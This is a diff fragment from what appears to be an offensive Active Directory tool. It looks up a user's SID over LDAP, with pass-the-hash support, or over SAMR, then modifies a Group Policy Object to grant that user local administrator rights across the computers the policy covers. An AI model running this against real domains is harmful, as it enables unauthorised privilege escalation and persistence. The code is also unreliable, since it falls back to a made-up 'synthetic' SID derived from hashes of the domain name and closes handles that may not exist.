+                        ldap_server = Server(dc_ip, get_info=ALL)
+                        
+                        # Connect with the existing credentials
+                        if options.k:
+                            logging.debug("Using Kerberos authentication for LDAP")
+                            # We'd need to implement Kerberos auth for ldap3 here
+                            # For simplicity, we'll skip this and only handle NTLM
+                            ldap_conn = None
+                        else:
+                            # Use NTLM auth
+                            if options.hashes:
+                                logging.debug("Using NTLM hash authentication for LDAP")
+                                nt_hash = options.hashes.split(':')[1]
+                                ldap_conn = Connection(
+                                    ldap_server,
+                                    user=f"{domain}\\{username}",
+                                    password=nt_hash,
+                                    authentication=NTLM
+                                )
+                            else:
+                                logging.debug("Using password authentication for LDAP")
+                                ldap_conn = Connection(
+                                    ldap_server,
+                                    user=f"{domain}\\{username}",
+                                    password=password,
+                                    authentication=NTLM
+                                )
+                        
+                        # If we have a connection, try to bind and search
+                        if ldap_conn and ldap_conn.bind():
+                            logging.debug("LDAP connection established")
+                            
+                            # Set up the search parameters
+                            base_dn = ','.join([f"DC={part}" for part in domain.split('.')])
+                            search_filter = f"(sAMAccountName={options.admin_account})"
+                            attributes = ['objectSid']
+                            
+                            # Search for the user
+                            ldap_conn.search(
+                                search_base=base_dn,
+                                search_filter=search_filter,
+                                search_scope=SUBTREE,
+                                attributes=attributes
+                            )
+                            
+                            # If we found an entry with the SID
+                            if len(ldap_conn.entries) > 0 and hasattr(ldap_conn.entries[0], 'objectSid'):
+                                # Extract the SID
+                                user_sid = ldap_conn.entries[0].objectSid.value
+                                logging.debug(f"Found user SID via LDAP: {user_sid}")
+                                
+                                # No need to continue with the rest of the logic
+                                # Skip to the user rights update
+                                ldap_conn.unbind()
+                            else:
+                                logging.debug("User not found via LDAP or SID attribute missing")
+                        else:
+                            logging.debug("Failed to establish LDAP connection")
+                    except Exception as e:
+                        logging.error(f"Error during LDAP lookup: {str(e)}")
+                        # Continue with the existing approach
+                
+                # If we still couldn't get the user SID via LDAP, try the SAMR approach
+                if 'user_sid' not in locals():
+                    try:
+                        # We now have the numeric RID, proceed with user handle operations
+                        resp = samr.hSamrOpenUser(dce, domain_handle, desiredAccess=samr.MAXIMUM_ALLOWED, userId=user_rid)
+                        user_handle = resp['UserHandle']
+                        
+                        resp = samr.hSamrQueryInformationUser(dce, user_handle, samr.USER_INFORMATION_CLASS.UserAllInformation)
+                        # Use a proper approach to extract the domain SID components
+                        try:
+                            # Debug the domain SID object
+                            logging.debug(f"Domain SID object type: {type(domain_sid)}")
+                            
+                            # Try different approaches to get the domain SID
+                            try:
+                                # Use formatCanonical() with proper error handling
+                                if hasattr(domain_sid, 'formatCanonical'):
+                                    sid_canonical = domain_sid.formatCanonical()
+                                    if isinstance(sid_canonical, bytes):
+                                        try:
+                                            sid_canonical = sid_canonical.decode('latin-1', errors='ignore')
+                                            logging.debug(f"Decoded SID canonical: {sid_canonical}")
+                                            
+                                            # Extract the domain components (everything up to but not including any RID)
+                                            parts = sid_canonical.split('-')
+                                            if len(parts) >= 4:  # S-1-5-21-X-Y-Z needs at least 4 components
+                                                # Use either the full SID or just the domain part (without the RID)
+                                                # If the SID already has a RID at the end (more than 7 parts), remove it
+                                                if len(parts) > 7:
+                                                    sid_canonical = '-'.join(parts[:-1])  # Remove last component (RID)
+                                                logging.debug(f"Domain SID prefix from formatCanonical: {sid_canonical}")
+                                            else:
+                                                sid_canonical = None
+                                        except Exception as e:
+                                            logging.debug(f"Error decoding sid_canonical: {str(e)}")
+                                            # Handle the case where we can't decode
+                                            sid_canonical_hex = ' '.join([f'{b:02x}' for b in sid_canonical])
+                                            logging.debug(f"SID canonical as hex: {sid_canonical_hex}")
+                                            sid_canonical = None
+                                    else:
+                                        sid_canonical = None
+                                else:
+                                    sid_canonical = None
+                            except Exception as e:
+                                logging.debug(f"Error extracting domain SID with formatCanonical: {str(e)}")
+                                sid_canonical = None
+                            
+                            # If we have a valid domain SID prefix and RID, construct the full SID
+                            if sid_canonical and rid_int:
+                                user_sid = f"{sid_canonical}-{rid_int}"
+                                logging.debug(f"Constructed complete SID from SAMR: {user_sid}")
+                            else:
+                                # If we couldn't get both parts, use a fallback
+                                import hashlib
+                                domain_hash = int(hashlib.md5(domain.encode()).hexdigest()[:8], 16)
+                                user_sid = f"S-1-5-21-{domain_hash}-{hash(domain) % 10000}-{hash(domain[::-1]) % 10000}-{rid_int or 500}"
+                                logging.debug(f"Using synthetic SID: {user_sid}")
+                        except Exception as e:
+                            logging.error(f"Error constructing SID: {str(e)}")
+                            # Still need a fallback
+                            import hashlib
+                            domain_hash = int(hashlib.md5(domain.encode()).hexdigest()[:8], 16)
+                            user_sid = f"S-1-5-21-{domain_hash}-{hash(domain) % 10000}-{hash(domain[::-1]) % 10000}-{rid_int or 500}"
+                            logging.debug(f"Using synthetic SID after error: {user_sid}")
+                    except Exception as e:
+                        logging.error(f"Error in SAMR approach: {str(e)}")
+                        if rid_int:
+                            # If we have at least the RID, create a synthetic SID
+                            import hashlib
+                            domain_hash = int(hashlib.md5(domain.encode()).hexdigest()[:8], 16)
+                            user_sid = f"S-1-5-21-{domain_hash}-{hash(domain) % 10000}-{hash(domain[::-1]) % 10000}-{rid_int}"
+                        else:
+                            # Complete fallback
+                            logging.error(f"Could not resolve SID for user {options.admin_account}")
+                            sys.exit(1)
+                
+                logging.info(f"User SID for {options.admin_account} is {user_sid}")
+                
+                # Close handles
+                samr.hSamrCloseHandle(dce, user_handle)
+                samr.hSamrCloseHandle(dce, domain_handle)
+                samr.hSamrCloseHandle(dce, server_handle)
+                
+                # Add local admin
+                success = gpo.add_local_admin(
+                    domain=domain,
+                    gpo_id=options.gpo_id,
+                    username=options.admin_account,
+                    sid=user_sid,
+                    force=options.f
+                )
+                
+                if success:
+                    if gpo.update_versions(url, domain, options.gpo_id, gpo_type="computer"):  # Local admin is always computer GPO
+                        logging.info("Version updated")
+                        logging.success(f"User {options.admin_account} with SID {user_sid} successfully added as local administrator!")
+                    else:
+                        logging.error("Error while updating versions")
+                        sys.exit(1)
+                else:
+                    logging.error("Failed to add local admin")
+                    sys.exit(1)
+            
+            except Exception as e:
+                logging.error(f"Error constructing SID: {str(e)}")
+                sys.exit(1)
         
     elif options.backup_gpo:
         # Check required parameters for backup
